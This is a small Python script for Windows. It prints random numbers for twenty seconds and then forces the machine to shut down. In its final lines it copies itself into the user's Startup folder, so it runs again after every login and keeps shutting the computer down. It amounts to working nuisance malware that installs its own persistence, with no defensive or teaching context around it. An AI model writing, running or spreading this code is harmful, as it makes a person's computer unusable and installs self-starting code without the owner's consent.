import random
import time
import os
start_time = time.time()
while True:
    randomnumber = random.randint(1, 100000000000000000000000000000000000000000)
    print(randomnumber)
    elapsed_time = time.time() - start_time
    if elapsed_time >= 20:
        os.system('shutdown /s /t 1')
        break
# Add the script to the startup folder
startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
script_path = os.path.abspath(__file__)
os.system(f'copy "{script_path}" "{startup_folder}"')
